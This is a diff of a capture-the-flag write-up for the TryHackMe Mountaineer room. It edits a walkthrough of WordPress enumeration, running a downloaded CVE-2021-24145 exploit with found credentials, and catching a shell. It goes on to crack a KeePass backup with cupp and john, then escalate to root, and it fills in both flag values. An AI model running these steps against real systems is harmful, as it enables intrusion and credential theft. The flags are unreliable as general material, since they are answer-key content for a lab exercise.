@@ -18,7 +18,7 @@ Note: For free users using the AttackBox, it is recommended to use your own VM.<
 <p><em>Answer the questions below</em></p>
 
 <p>1.1.What is the local.txt flag?<br>
-<code>_____</code></p>
+<code>97a805eb710deb97342a48092876df22</code></p>
 
 
 
@@ -81,7 +81,7 @@ wordpress               [Status: 301, Size: 178, Words: 6, Lines: 8]
 - /wordpress/license.txt<br>
 - /wordpress/readme.html<br>
 - /wordpress/images<br>
-- /wordpress/wp-admin --> <code>http://mountaineer.thm/wordpress/](http://mountaineer.thm/wordpress/wp-login.php?redirect_to=http%3A%2F%2FTargetIP%2Fwordpress%2Fwp-admin%2F&reauth=1)</code><br>
+- /wordpress/wp-admin --> <code>http://mountaineer.thm/wordpress/](http://mountaineer.thm/wordpress/wp-login.php?redirect_to=http%3A%2F%2FTargetIP%2Fwordpress%2Fwp-admin%2F&reauth=1</code><br>
 - /wordpress/wp-admin/admin-ajax.php<br>
 - /wordpress/wp-admin/setup-config.php<br>
 - /wordpress/wp-admin/install.php<br>
@@ -276,7 +276,7 @@ var userProfileL10n = {"user_id":"0","nonce":"d0aa631fea"};
 
 
 
-<h3>Burp Suite</h3>
+<h3>Burp Suite and FoxyProxy</h3>
 
 
 <img width="1461" height="494" alt="image" src="https://github.com/user-attachments/assets/e1cbb1db-6310-448d-8730-97f8aab2a5ca" />
@@ -290,7 +290,7 @@ var userProfileL10n = {"user_id":"0","nonce":"d0aa631fea"};
 TargetIP mountaineer.thm adminroundcubemail.mountaineer.thm
 ```
 
-<h3>location</h3>
+<h3>Location</h3>
 
 <img width="1270" height="304" alt="image" src="https://github.com/user-attachments/assets/fb279547-100b-46c4-a29a-c4bb3a68b877" />
 
@@ -298,17 +298,13 @@ TargetIP mountaineer.thm adminroundcubemail.mountaineer.thm
 
 <img width="1129" height="477" alt="image" src="https://github.com/user-attachments/assets/692d840e-d539-4c3f-93a4-2001146f2294" />
 
-
 <img width="1129" height="711" alt="image" src="https://github.com/user-attachments/assets/9d786867-97fc-40ef-825e-e5fce2f5430b" />
 
 <p>th3_tall3st_password_in_th3_world</p>
 
 <img width="1131" height="713" alt="image" src="https://github.com/user-attachments/assets/b2505516-9d65-4a68-a17d-617dc6d1f51d" />
 
-<p>Lhotse, MrSecurity , BestMountainsInc, lhotse@localhost.thm</p>
-
-
-
+<p>Mount, Lhotse, MrSecurity , BestMountainsInc, lhotse@localhost.thm, ...</p>
 
 <img width="1134" height="721" alt="image" src="https://github.com/user-attachments/assets/54f4dc88-5ed7-4444-abfd-624d9ba9105f" />
 
@@ -317,24 +313,12 @@ TargetIP mountaineer.thm adminroundcubemail.mountaineer.thm
 
 <img width="1128" height="664" alt="image" src="https://github.com/user-attachments/assets/cf742582-2a8b-40ca-8eb0-0c50b82683ae" />
 
-
 <h3>exploit</h3>
-
 
 ```bash
 :~/Mountaineer# wget https://raw.githubusercontent.com/Hacker5preme/Exploits/refs/heads/main/Wordpress/CVE-2021-24145/exploit.py
---2025-07-31 00:20:43--  https://raw.githubusercontent.com/Hacker5preme/Exploits/refs/heads/main/Wordpress/CVE-2021-24145/exploit.py
-Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
-Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 22058 (22K) [text/plain]
-Saving to: \u2018exploit.py\u2019
-
-exploit.py                         100%[===============================================================>]  21.54K  --.-KB/s    in 0s      
-
-2025-07-31 00:20:43 (52.5 MB/s) - \u2018exploit.py\u2019 saved [22058/22058]
+...
 ```
-
 
 ```bash
 :~/Mountaineer# python3 exploit.py -T mountaineer.thm -P 80 -U /wordpress/ -u k2 -p th3_tall3st_password_in_th3_world
@@ -388,13 +372,15 @@ drwxr-xr-x  2 root    root    4096 Apr  6  2024 makalu
 drwxr-xr-x  2 root    root    4096 Apr  6  2024 manaslu
 drwxr-xr-x  3 nanga   nanga   4096 Apr  6  2024 nanga
 drwxr-x---  5 vagrant vagrant 4096 Apr  6  2024 vagrant
+```
+
+```bash
 www-data@mountaineer:/home$ find . -type f 2>/dev/null
 ./kangchenjunga/.bash_history
 ./kangchenjunga/local.txt
 ./kangchenjunga/mynotes.txt
 ./nanga/ToDo.txt
 ./lhotse/Backup.kdbx
-www-data@mountaineer:/home$ 
 ```
 
 
@@ -413,60 +399,47 @@ Connection received on TargetIP 56782
 
 ```bash
 :~/Mountaineer# git clone https://github.com/ivanmrsulja/keepass2john.git
-Cloning into 'keepass2john'...
-remote: Enumerating objects: 27, done.
-remote: Counting objects: 100% (27/27), done.
-remote: Compressing objects: 100% (21/21), done.
-remote: Total 27 (delta 11), reused 14 (delta 6), pack-reused 0 (from 0)
-Unpacking objects: 100% (27/27), 11.21 KiB | 1.02 MiB/s, done.
-root@ip-10-10-181-135:~/Mountaineer# python keepass2john.py Backup.kdbx > hash
-/usr/bin/python: can't open file 'keepass2john.py': [Errno 2] No such file or directory
-root@ip-10-10-181-135:~/Mountaineer# ls
-Backup.kdbx  exploit.py  hash  keepass2john  reports
-root@ip-10-10-181-135:~/Mountaineer# cd keepass2john
-root@ip-10-10-181-135:~/Mountaineer/keepass2john# ls
-keepass2john.pl  keepass2john.py  LICENSE  README.md
-root@ip-10-10-181-135:~/Mountaineer/keepass2john# python keepass2john.py /root/Mountaineer/Backup.kdbx > hash
-  File "keepass2john.py", line 9
-    def stringify_hex(hex_bytes: bytes):
-                               ^
-SyntaxError: invalid syntax
-root@ip-10-10-181-135:~/Mountaineer/keepass2john# python3 keepass2john.py /root/Mountaineer/Backup.kdbx > hash
-root@ip-10-10-181-135:~/Mountaineer/keepass2john# ls
-hash  keepass2john.pl  keepass2john.py  LICENSE  README.md
-root@ip-10-10-181-135:~/Mountaineer/keepass2john# 
-```
-
-```bash
-:~/Mountaineer# git clone https://github.com/ivanmrsulja/keepass2john.git
-Cloning into 'keepass2john'...
-remote: Enumerating objects: 27, done.
-remote: Counting objects: 100% (27/27), done.
-remote: Compressing objects: 100% (21/21), done.
-remote: Total 27 (delta 11), reused 14 (delta 6), pack-reused 0 (from 0)
-Unpacking objects: 100% (27/27), 11.21 KiB | 1.02 MiB/s, done.
 ```
 
 
 ```bash
 :~/Mountaineer# python keepass2john.py Backup.kdbx > hash
 /usr/bin/python: can't open file 'keepass2john.py': [Errno 2] No such file or directory
+root@ip-10-10-181-135:~/Mountaineer# ls
+Backup.kdbx  exploit.py  hash  keepass2john  reports
 ```
 
 ```bash
-:~/Mountaineer# ls
-Backup.kdbx  exploit.py  hash  keepass2john  reports
 :~/Mountaineer# cd keepass2john
+```
+
+```bash
 :~/Mountaineer/keepass2john# ls
 keepass2john.pl  keepass2john.py  LICENSE  README.md
 ```
 
 ```bash
-:~/Mountaineer/keepass2john# python keepass2john.py /root/Mountaineer/Backup.kdbx > hash
-  File "keepass2john.py", line 9
-    def stringify_hex(hex_bytes: bytes):
-                               ^
-SyntaxError: invalid syntax
+:~/Mountaineer/keepass2john# python3 keepass2john.py /root/Mountaineer/Backup.kdbx > hash
+```
+
+```bash
+:~/Mountaineer/keepass2john# ls
+hash  keepass2john.pl  keepass2john.py  LICENSE  README.md
+```
+
+```bash
+:~/Mountaineer# git clone https://github.com/ivanmrsulja/keepass2john.git
+```
+
+```bash
+:~/Mountaineer# ls
+Backup.kdbx  exploit.py  hash  keepass2john  reports
+```
+
+```bash
+:~/Mountaineer# cd keepass2john
+:~/Mountaineer/keepass2john# ls
+keepass2john.pl  keepass2john.py  LICENSE  README.md
 ```
 
 ```bash
@@ -475,12 +448,10 @@ SyntaxError: invalid syntax
 hash  keepass2john.pl  keepass2john.py  LICENSE  README.md
 ```
 
-
 ```bash
 :~/Mountaineer/keepass2john# apt install cupp
 ...
 ```
-
 
 ```bash
 :~/Mountaineer/keepass2john# cupp -i
@@ -528,21 +499,11 @@ hash  keepass2john.pl  keepass2john.py  LICENSE  README.md
 [+] Now load your pistolero with mount.txt and shoot! Good luck!
 ```
 
-
 ```bash
 :~/Mountaineer/keepass2john# john --wordlist=mount.txt hash
-Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
-Use the "--format=KeePass-opencl" option to force loading these as that type instead
-Using default input encoding: UTF-8
-Loaded 1 password hash (KeePass [SHA256 AES 32/64])
-Cost 1 (iteration count) is 60000 for all loaded hashes
-Cost 2 (version) is 2 for all loaded hashes
-Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
-Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
+...
 Lhotse56185      (Backup<SHOULD_BE_REMOVED_INCLUDING_COLON>)
-1g 0:00:00:02 DONE (2025-07-31 00:52) 0.3521g/s 81.69p/s 81.69c/s 81.69C/s Lhotse56058..Lhotse5658
-Use the "--show" option to display all of the cracked passwords reliably
+...
 Session completed. 
 ```
 
@@ -555,16 +516,14 @@ Backup<SHOULD_BE_REMOVED_INCLUDING_COLON>:Lhotse56185
 
 ```bash
 :~/Mountaineer/keepass2john# apt install kpcli
-...
 ```
 
 ```bash
 :~/Mountaineer/keepass2john# kpcli --kbd Backup.kbdx
-...
 ```
 
 ```bash
-~/Mountaineer# kpcli --kdb Backup.kdbx
+:~/Mountaineer# kpcli --kdb Backup.kdbx
 Please provide the master password: *************************
 
 KeePass CLI (kpcli) v3.1 is ready for operation.
@@ -572,7 +531,6 @@ Type 'help' for a description of available commands.
 Type 'help <command>' for details on individual commands.
 
 kpcli:/> 
-
 ```
 
 
@@ -587,6 +545,11 @@ kpcli:/>
 kangchenjunga@mountaineer:~$ cat local.txt
 97a805eb710deb97342a48092876df22
 ```
+
+<br>
+
+<p>1.2. What is the root.txt flag?<br>
+<code>a41824310a621855d9ed507f29eed757</code></p>
 
 
 ```bash
@@ -621,6 +584,8 @@ bash
 exit
 ```
 
+
+<h3>root</h3>
 
 ```bash
 kangchenjunga@mountaineer:~$ su root
